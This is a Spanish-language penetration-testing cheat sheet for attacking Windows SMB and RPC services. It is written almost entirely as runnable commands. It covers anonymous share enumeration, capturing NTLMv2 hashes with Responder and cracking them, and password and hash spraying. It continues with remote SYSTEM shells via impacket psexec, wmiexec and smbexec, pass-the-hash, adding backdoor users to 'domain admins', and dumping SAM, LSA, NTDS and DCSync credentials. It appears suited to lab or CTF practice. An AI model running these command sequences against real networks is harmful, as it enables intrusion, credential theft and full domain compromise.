# SMB (445) / RPC (135)

Tags: #SMB #RPC #PsExec #Windows #Enum #Credentials #LateralMovement

## OBJETIVO

- Enumerar shares
- Encontrar credenciales
- Validar acceso
- Ejecutar código remoto (si aplica)
- Escalar / pivotar

## TIPS

1. **Si nxc falla → usa impacket**
2. **Si enum4linux falla → usa rpcclient**
3. **Si tienes creds → prueba TODO (SMB, WinRM, RDP, MSSQL)**

## TOOLS

- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [Sprayhound](https://github.com/Hackndo/sprayhound)

## ÍNDICE RÁPIDO (según lo que tengas en la mano)

|Tengo...|Ir a|
|---|---|
|Nada, solo la IP|[[#1. Reconocimiento sin credenciales]]|
|Acceso a un share (null/guest)|[[#2. Enumeración de shares]] → [[#3. Descarga y análisis]]|
|Un hash NTLMv2 capturado|[[#6. Spraying / Bruteforce]] (crackeo con hashcat)|
|Lista de usuarios, sin passwords|[[#4. Enumeración de usuarios / dominio]] → [[#6. Spraying / Bruteforce]]|
|Credenciales válidas (usuario normal)|[[#5. Validación y enumeración con credenciales]]|
|Admin local confirmado ([Pwn3d!])|[[#7. Ejecución remota (admin local)]]|
|Admin local / privilegios AD altos|[[#8. Dump de credenciales]]|
|Creds válidas y quiero pivotar a WinRM / MSSQL / LDAP|[[#9. Movimiento lateral a otros protocolos]]|
|Necesito cambiar password de un usuario (ACL abuse)|[[#10. Casos especiales]]|

## 1. Reconocimiento sin credenciales

```bash
❯ nxc smb IP     # Enumerar el servicio SMB

# Resultados:
	- Signing:True    = El firmado SMB es obligatorio. Olvidate del SMB relay contra este host.
	- SMBv1:True      = La máquina tiene habilitado SMBv1, un protocolo que debería estar muerto desde el 2017. Es la superficie de EternalBlue (MS17-010).
	- Null Auth:True  = Acepta sesión nula (login anónimo)
```

```bash
❯ responder -I eth0    # Inicia Responder en la interfaz indicada → escucha/broadcast y responde a queries LLMNR/NBT-NS y fuerza autenticación NTLMv2

❯ hashcat -m 5600 hash_user.txt /usr/share/wordlists/rockyou.txt    # Crackear el NTLMv2
```

```bash 
# IMPORTANTE 
❯ nxc smb <IP>   # No requiere creds → muestra dominio, OS y SMB signing (clave para relay)

❯ nxc smb <IP> --generate-hosts-file hosts     # Crear un archivo 'hosts' con las combinaciones 
❯ cat /etc/hosts hosts | sponge /etc/hosts     # Colocar el resultado en el /etc/hosts 
```

```bash
# ENUMERACIÓN 
❯ nxc smb <IP/rango>
# Mapear toda la red

❯ nxc smb <IP/rango> --gen-relay-list relay.txt
# Requiere SMB signing OFF → genera lista de hosts vulnerables a NTLM relay

❯ nxc smb <IP> -u '' -p '' --shares
❯ nxc smb <IP> -u 'a' -p '' --shares
❯ nxc smb <IP> -u 'guest' -p '' --shares
❯ nxc smb <IP> -u 'null' -p '' --shares
# Enumerar con null session al SMBv1/SMBv2

❯ nxc smb <IP> -u 'guest' -p '' -M spider_plus
# Enumeración más profunda de los shares SMB accesibles y recorre sus directorios/archivos

❯ nxc smb <IP> -u '' -p '' --shares --users --pass-pol
# Todo en un solo comando con null session

❯ nxc smb <IP/rango> --gen-relay-list hosts_sin_signing.txt
# Mapear toda la red buscando hosts sin SMB signing (clave para relay attacks)

❯ nxc smb <IP> -u 'guest' -p '' --rid-brute | grep "SidTypeUser"
❯ nxc smb <IP> -u 'guest' -p '' --rid-brute | grep "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt
# Enum usuarios válidos por RID → no requiere creds

❯ nxc smb <IP> -u users.txt -p '' --continue-on-success 
# Si al buscar usuarios le podemos asignar una password si estos salen con el siguiente mensaje:
	[-] domain.local\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
❯ impacket-changepasswd domain.local/user:'Passwd'@IP -newpass 'P@$$w0rd123!'
# Cambiar la password 

❯ nmblookup -A <IP>
# No requiere creds → obtiene NetBIOS (hostname + posible dominio)

❯ smbmap -H <IP> --no-banner
# No requiere creds → enum rápida de shares y permisos (READ/WRITE)

❯ smbmap -H <IP> -u '' -p ''
# Null session explícita → confirma acceso anónimo

❯ smbmap -H <IP> -u 'guest' -p ''
# Prueba usuario guest → a veces tiene más permisos que null

❯ smbmap -H <IP> -r    # Mirar los archivos existentes de manera recursiva 

❯ smbclient -L <IP> -N
# Requiere null session → lista shares anónimos (si IPC$ permite acceso)

❯ smbclient -L <IP> -N --option='client min protocol=NT1'
# Fuerza SMBv1 → útil en targets legacy donde falla SMBv2/3
```

### Insight importante

- Si **null session funciona → PRIORIDAD ALTA**
- Si ves shares → entra inmediatamente

## 2. Enumeración de shares 

```bash
❯ smbmap --help   # Panel de ayuda 

❯ smbmap -H <IP> -u user -p passwd     # Enumeración con el usuario invitado

❯ smbmap -H <IP> -u user -p passwd -r  # Mirar los archivos existentes de manera recursiva con credenciales 

❯ smbmap -H <IP> -r <share>
❯ smbmap -H <IP> -u user -p passwd -r <share>
# Requiere READ → lista contenido del share (rápido, sin interactivo)

❯ smbmap -H <IP> -r 'dir uno'
# Requiere READ → enum de un directorio específico

❯ smbmap -H <IP> -r sysvol
# SYSVOL (AD) → scripts/GPP → alto valor para credenciales
```

```bash
# SI SE TIENE PERMISOS DE LECTURA

❯ smbclient -N //<IP>/<share>   # Requiere null session → acceso interactivo al share
	❯ recurse ON    # Activa el recorrido recursivo de directorios
	❯ prompt OFF    # Elimina la parte de preguntar al descargar
	❯ mget *        # Descargar todo
❯ tree <share>      # Listar en forma de árbol toda la carpeta descargada

❯ smbclient -U user //<IP>/ShareName   # Requiere creds → acceso directo al share
	❯ dir             # Listar contenido del share
	❯ get <file>      # Descargar archivo
	❯ put <file>      # Subir archivo (si hay permisos de escritura)
	❯ prompt off
	❯ mget *          # Descargar todos los archivos sin confirmación
	❯ more <file>     # Leer archivos directamente

❯ smbclient //<IP>/<share> -U 'guest'
# Acceso como guest → puede ampliar permisos

❯ smbclient //<IP>/<share> -N -c 'dir' | grep -E '^[[:space:]]+[A-Za-z]+\.[A-Za-z]+' | awk '{print $1}' > users.txt 
# Si en una carpeta hay nombres de usuarios asi se extraen en un archivo 

❯ smbclient //<IP>/<share> -U 'user%pass'
# Requiere creds válidas → acceso interactivo autenticado

❯ smbclient -L <IP> -U 'user'
# Requiere creds → lista shares visibles para el usuario

++++++++++++++

# SI SE TIENE PERMISOS DE ESCRITURA

❯ smbclient -N //<IP>/<share> -c 'put file.txt file.txt; ls'   # Subir un archivo al dir y guardarlo como 'file.txt'

++++++++++++++

NOTA:
	1. D - Directory
	2. DH - Hidden Directory
	3. H - Hidden File
	4. N - Normal File
```

### Condiciones clave

- READ → puedes descargar
- WRITE → puedes subir (posible RCE indirecto)

## 3. Descarga y análisis

```bash
❯ smbmap -H <IP> --download anonymous/file.txt
# Requiere READ → descarga archivo específico

❯ smbmap -H <IP> -r sysvol -A file.txt -q
# Requiere READ → busca patrones y descarga coincidencias (ej: passwords)

❯ smbmap -H <IP> --download 'C$\flag.txt'
# Requiere creds válidas → acceso a disco administrativo

❯ smbmap -H <IP> -u 'user' -p 'pass' -r 'C$'
# Requiere creds → enum de disco (C$)

❯ smbmap -H <IP> -u 'user' -p 'pass' -R 'dir uno'
# Requiere creds → enum recursiva autenticada

❯ mount -t cifs //<IP>/<share> /tmp/mnt -o username=null,password=null,rw
# Requiere null session → montar share local para análisis cómodo

❯ mount -t cifs //<IP>/<share> /tmp/mnt -o username=user,password=pass,domain=,rw
# Requiere creds → montar share autenticado

❯ tree
❯ tree -fas
# Visualizar estructura (rutas completas/permisos)

❯ umount /tmp/mnt
# Desmontar share
```

### Insight

- Si puedes montar → revisa TODO (scripts, backups, configs)

## 3.5 Análisis de archivos (post-descarga)

```bash
# Buscar credenciales en share montado
❯ grep -ri "passw\|cred\|secret\|key\|pwd" /tmp/mnt/ 2>/dev/null

❯ grep -ri "passw\|cred\|secret\|key\|pwd" /tmp/mnt/ \
  --include="*.txt" \
  --include="*.xml" \
  --include="*.config" \
  --include="*.ini" \
  --include="*.ps1" \
  --include="*.bat"

# Buscar tipos de archivos interesantes
❯ find /tmp/mnt -name "*.xml" \
  -o -name "*.config" \
  -o -name "*.ini" \
  -o -name "*.txt" \
  -o -name "*.ps1" \
  -o -name "*.bat" \
  -o -name "*.bak" \
  2>/dev/null

# Buscar archivos modificados recientemente (últimos 90 días)
❯ find /tmp/mnt -mtime -90 -type f 2>/dev/null

# GPP — si tienes acceso a SYSVOL
❯ find /tmp/mnt -name "Groups.xml" 2>/dev/null
❯ grep -ri "cpassword" /tmp/mnt/ 2>/dev/null

# Si encuentras cpassword → desencriptar con:
❯ gpp-decryp "cpassword"
```

### Insight

- `.config` y `.xml` → credenciales de servicios/apps
- `.ps1` y `.bat` → hardcoded passwords frecuentes
- `Groups.xml` en SYSVOL → GPP creds (MS14-025)
- Archivos recientes → más probabilidad de creds activas

## 4. Enumeración de usuarios / dominio

```bash
❯ enum4linux <IP> -a
# No requiere creds → enum legacy (puede fallar en AD modernos)

❯ enum4linux-ng <IP> -A
# No requiere creds → versión moderna (mejor cobertura en AD)

❯ enum4linux <IP> -U
# Usuarios

❯ enum4linux <IP> -S
# Shares

❯ enum4linux <IP> -G
# Grupos

❯ enum4linux <IP> -o
# OS info

❯ enum4linux <IP> -i
# Impresoras

❯ enum4linux <IP> -a -U ''
# Usuarios con null session

❯ enum4linux -a -u "admin" -p 'password' <IP>
# Requiere creds → enum más completa
```

### Limitación

- enum4linux falla en entornos modernos → usa nxc mejor

## 5. Validación y enumeración con credenciales

> Punto de entrada cuando ya tienes un par usuario/password o un hash válido.

```bash
❯ nxc smb <IP> -u 'user' -p 'pass'
# Valida creds → [Pwn3d!] indica admin local

❯ nxc smb <IP> -u 'user' -H 'hash'
# Pass-the-Hash → usa NT hash (no LM)

❯ smbmap -H <IP> -u 'user' -p 'pass'
# Ver permisos de shares con ese usuario

❯ smbmap -H <IP> -d domain.com -u 'user' -p 'pass'
# Autenticación contra dominio

❯ smbmap -H <IP> -u "" -p ""
# Test de credenciales vacías
```

### Insight

- Credencial válida ≠ privilegios
- Necesitas verificar si es: usuario normal / admin / servicio

```bash
❯ nxc smb <IP> -u 'user' -p 'pass' --shares
# Shares accesibles

❯ nxc smb <IP> -u user -p 'pass' --users    # Enumerar usuarios del dominio
❯ nxc smb <IP> -u user -p 'pass' --users | awk '$4 == "DC" && $5 != "[+]" && $5 != "[*]" && $5 != "-Username-" {print $5}' > users.txt
# Agregar los usuarios del dominio en un archivo 
	# DC = Se refiere al nombre que aparece antes del usuario (Cambiar)

❯ nxc smb <IP> -u 'user' -p 'pass' --pass-pol
# Política de contraseñas (lockout, longitud, etc.)

❯ nxc smb <IP> -u 'user' -p 'pass' -M spider_plus
# enumeración más profunda de los shares SMB accesibles y recorre sus directorios/archivos

❯ nxc smb <IP> -u 'user' -p 'pass' --spider <share> --regex .
# Búsqueda recursiva de archivos

❯ nxc ldap <IP> -u 'user' -p 'pass' --groups
# Grupos locales y del dominio

❯ nxc smb <IP> -u 'user' -p 'pass' --local-users
# Usuarios locales (distinto a --users que es del dominio)

❯ nxc smb <IP> -u 'user' -p 'pass' --sessions
# Sesiones activas — útil para ver qué usuarios están logueados

❯ nxc smb <IP> -u 'user' -p 'pass' --loggedon-users
# Usuarios logueados actualmente (clave para decidir dónde hacer token impersonation)

❯ nxc smb <IP> -u 'user' -p 'pass' --disks
# Discos disponibles

❯ nxc smb <IP> -u 'user' -p 'pass' --laps
# Requiere pertenecer a LAPS_Readers → obtiene passwords locales
```

## 6. Spraying / Bruteforce

```bash
# Fuerza bruta → cuidado con lockout
❯ nxc smb <IP> -u users.txt -p passwd.txt --continue-on-success --ignore-pw-decoding
	# --ignore-pw-decoding (Optional)

❯ nxc smb <IP> -u users.txt -p passwd.txt --continue-on-success --no-bruteforce
# Paraleliza pruebas (más rápido)
# --no-bruteforce → probar de forma paralela los diccionarios

❯ nxc smb <IP> -u users.txt -p users.txt --no-bruteforce
# Password spraying con dos diccionarios

❯ nxc smb <IP> -u users.txt -p 'Password1' --continue-on-success
# Password spraying → más sigiloso

❯ nxc smb <IP> -u users.txt -p ''
# Prueba passwords vacíos

❯ nxc smb <IP> -u users.txt -H 'hash'
# Hash spraying
```

```bash
# Sprayhound - No autenticado
# Single user, single password
sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP>

# User list, single password
sprayhound -U ./users.txt -p Pentest123.. -d Domain01.local -dc <IP>

# User as pass
sprayhound -U ./users.txt -d Domain01.local -dc <IP>

# User as pass con password en minúsculas
sprayhound -U ./users.txt --lower -d Domain01.local -dc <IP>

# User as pass con password en mayúsculas
sprayhound -U ./users.txt --upper -d Domain01.local -dc <IP>
```

```bash
# Sprayhound - Autenticado
# Single user, single password
sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# All domain users, single password
sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# All domain users, single password, usando cuenta de un dominio confiado
sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu 'babdcatha.net\Babd' -lp P4ssw0rd

# User as pass en todos los usuarios del dominio
sprayhound -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# User as pass con password en minúsculas
sprayhound --lower -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# User as pass con password en mayúsculas
sprayhound --upper -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
```

```bash
❯ hydra -L users.txt -P pass.txt smb://<IP>
# Alternativa de brute force
# Limitación: puede fallar con SMBv1 / configs modernas
# Hydra no es compatible con la versión 'SMBv1', el que sí lo puede hacer con todas las versiones es 'Metasploit'
```

### Condiciones

- Lockout policy → cuidado con brute force
- RID brute → no requiere creds (ver [[#4. Enumeración de usuarios / dominio]])

## 7. Ejecución remota (admin local)

```bash
Jerarquía de preferencia para ejecución remota:
1. evil-winrm → más cómodo, da shell interactiva limpia
2. impacket-psexec → shell SYSTEM, crea servicio (más ruido)
3. impacket-wmiexec → más sigiloso, no crea servicio
4. impacket-smbexec → cuando los otros fallan
5. nxc -x → para comandos puntuales sin shell
```

```bash
❯ nxc smb <IP> -u 'user' -p 'pass' -x 'ipconfig'
# Ejecutar comando
# Requiere: ADMIN LOCAL

❯ nxc smb <IP> -u 'user' -p 'pass' -x 'dir C:\\'
# Acceso a filesystem

❯ nxc smb <IP> -u 'user' -p 'pass' -x 'type C:\\file.txt'
# Leer archivos

❯ nxc smb <IP> -u 'user' -p 'pass' -x 'net user omar Password1 /add'
# Crear usuario (persistencia)

❯ nxc smb <IP> -u 'user' -p 'pass' -x 'net group "domain admins" omar /add'
# Escalada (solo si ya eres admin del dominio)

❯ smbmap -H <IP> -u 'user' -p 'pass' -x 'ipconfig'
# Alternativa
```

```bash
❯ impacket-smbexec domain.corp/user:'Password'@IP
# Ingresar por smb
# Crea servicio → devuelve shell como NT AUTHORITY\SYSTEM

❯ impacket-smbexec 'Administrator'@<IP> -hashes LM:NT
# Alternativa a psexec
# Más estable en algunos entornos pero menos interactivo

❯ impacket-psexec -port 445 domain/user@<IP> -hashes :NThash
# Especificar puerto cuando el default falla

❯ impacket-psexec domain.corp/Administrator:Password@<IP> cmd.exe
# Requiere credenciales válidas + admin local
# Crea servicio → devuelve shell como NT AUTHORITY\SYSTEM

❯ impacket-psexec domain.corp/Administrator@<IP> cmd.exe
# Variante cuando ya tienes contexto de credenciales (ej: Kerberos / cache)

❯ impacket-psexec administrator@<IP> cmd.exe
# Usuario local (no dominio)

❯ impacket-psexec domain.corp/'Administrator'@<IP> -hashes :NT
# Pass-the-Hash → solo necesitas NT hash (no password)
# Requiere admin local

❯ impacket-atexec domain/user:'pass'@<IP> "whoami"
# Ejecución vía Task Scheduler — más sigiloso que psexec

❯ impacket-wmiexec 'Administrator'@<IP> -hashes LM:NT
# Más sigiloso (no crea servicio)
# Requiere admin local

❯ impacket-wmiexec domain.corp/Administrator@<IP> -no-pass -hashes LM:NT
# Variante con dominio
# -no-pass → indica que usas hash, no password

❯ impacket-psexec user:pass@<IP>
# Shell SYSTEM
# Requiere admin local

❯ impacket-smbexec user:pass@<IP>
	❯ dir C:\Users     # No te deja usar el comando 'cd'
# Alternativa cuando psexec falla

❯ impacket-wmiexec user:pass@<IP>
# Más sigiloso (no crea servicio)

❯ pth-winexe -U 'domain/user%LM:NT' //<IP> cmd.exe
# El hash debe ir como 'LM:NT'
# Pass-the-Hash remoto
# Requiere:
# - credenciales admin
# - SMB accesible
```

```bash
❯ nxc winrm <IP> -u 'user' -p 'pass'
# Requiere grupo "Remote Management Users" → acceso remoto
# Muestra [Pwn3d!]

❯ nxc winrm <IP> -u 'user' -p 'pass' -d domain -x 'whoami'
# Ejecución remota vía WinRM
```

## 8. Dump de credenciales

```bash
❯ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# Cuando tienes los archivos SAM/SYSTEM descargados físicamente
# (backups, VSS, etc.) — no necesitas conectividad al host

❯ nxc smb <IP> -u 'user' -p 'pass' --lsa
# LSA secrets — a veces tiene creds en claro de servicios

❯ nxc smb <IP> -u 'user' -p 'pass' --ntds
# Dump de NTDS → requiere privilegios AD altos

❯ nxc smb <IP> -u 'user' -H 'hash' --ntds
# Igual pero con hash

❯ nxc smb <IP> -u 'user' -p 'pass' --sam
# Dump local → requiere admin

❯ impacket-secretsdump 'user':'pass'@<IP> -history -pwd-last-set
# Dump completo → incluye historial y fechas

❯ impacket-secretsdump -just-dc domain.corp/'user':passwd@<IP> -history -pwd-last-set
# DCSync → requiere privilegios AD:
# - GetChanges
# - GetChangesAll
# Muestra: hashes, historial de passwords, última modificación
```

## CONDICIONES CLAVE

- Null session → enum sin creds
- Creds válidas → acceso ampliado
- Admin local → ejecución remota
- Permisos AD → DCSync

## ONE-LINERS MENTALES

- SMB abierto → probar null session
- Share accesible → buscar credenciales
- Credenciales → reutilizar en TODO
- [Pwn3d!] → ejecutar comandos ya
- SYSVOL → revisar scripts